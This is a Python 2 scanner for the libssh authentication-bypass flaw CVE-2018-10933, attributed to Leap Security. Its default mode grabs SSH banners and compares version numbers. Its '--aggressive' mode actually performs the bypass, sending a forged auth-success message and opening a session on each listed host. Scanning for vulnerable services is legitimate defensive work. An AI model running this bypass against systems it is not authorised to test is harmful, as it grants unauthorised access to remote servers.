#!/usr/bin/env python2
# CVE-2018-10933 Scanner by Leap Security (@LeapSecurity) https://leapsecurity.io


import socket, argparse, sys, os, paramiko

VERSION = "1.0.2"

class colors(object):
    blue = "\033[1;34m"
    normal = "\033[0;00m"
    red = "\033[1;31m"
    yellow = "\033[1;33m"

def pstatus(ip, port, banner):
  print("{blue}[*]{white} {ipaddr}:{port} is not vulnerable to authentication bypass ({banner})".format(blue=colors.blue, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))

def ptimeout(ip, port):
  print("{red}[-]{white} {ipaddr}:{port} has timed out.".format(red=colors.red, white=colors.normal, ipaddr=ip, port=port))

def ppatch(ip, port, banner):
  print("{blue}[*]{white} {ipaddr}:{port} has been patched ({banner})".format(blue=colors.blue, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))

def pvulnerable(ip, port, banner):
  print("{yellow}[!]{white} {ipaddr}:{port} is likely VULNERABLE to authentication bypass ({banner})".format(yellow=colors.yellow, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))


def passive(ip, port): #banner grab to verify vulnerable host
  try:
    s = socket.create_connection((ip, port), timeout=0.50000)
    s.settimeout(None)
    banner = s.recv(1024)
    s.close()
    return banner
  except (socket.timeout, socket.error) as e:
    ptimeout(ip, port)

def aggressive(ip, port): #bypass auth to verify vulnerable host
  try:
    s = socket.create_connection((ip, port), timeout=0.50000)
    s.settimeout(None)

    msg = paramiko.message.Message()
    t = paramiko.transport.Transport(s)
    t.start_client()
    with open("paramiko.log") as f: #tmp solution to get banner, can't seem to get _transport.get_banner() working
      banner =  f.readlines()[-10].split(" ")[-1]
    msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    t._send_message(msg)
    c = t.open_session(timeout=0.50000)
    s.close()
    pvulnerable(ip, port, banner)
  except (socket.timeout, socket.error) as e:
    ptimeout(ip, port)
  except paramiko.SSHException as e:
    pstatus(ip, port, banner)
    #print e
  except Exception as e:
    pass

parser = argparse.ArgumentParser(description='libssh Scanner - Find vulnerable libssh services by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="An ip address or new line delimited file containing IPs to banner grab for the vulnerability.")
parser.add_argument("-V", "--version", action="version", help="Show version and exit", default=VERSION)
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument("-a", "--aggressive", action="store_true", help="Identify vulnerable hosts by bypassing authentication")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()
ips, results = [], []

print("\nlibssh scanner {}\n".format(VERSION))


if os.path.isfile(args.target): #if file add hosts
  with open (args.target) as f:
      for line in f.readlines():
          ips.append(line.strip())
else: #if not scan the provided IP
  ips.append(args.target.strip())


print("Searching for Vulnerable Hosts...\n")
if args.aggressive:
  paramiko.util.log_to_file("paramiko.log")
  for ip in ips:
    aggressive(ip, int(args.port))
else: #banner grab
  for ip in ips:
    banner = passive(ip, int(args.port)) #banner
    if banner:
      if b"libssh-0.6" in banner: #vulnerable
        pvulnerable(ip, args.port, banner)
      elif b"libssh-0.7" in banner: #check if patched
        if int(banner.split(".")[-1]) >= 6: #libssh is 0.7.6 or greater (patched)
          ppatch(ip, args.port, banner)
        else:
          pvulnerable(ip, args.port, banner)
      elif b"libssh-0.8" in banner: #check if patched
        if int(banner.split(".")[-1]) >= 4: #libssh is 0.8.4 or greater (patched)
          ppatch(ip, args.port, banner)
        else:
          pvulnerable(ip, args.port, banner)
      else: #not vulnerable
        pstatus(ip, args.port, banner)

print("\nScanner Completed Successfully")
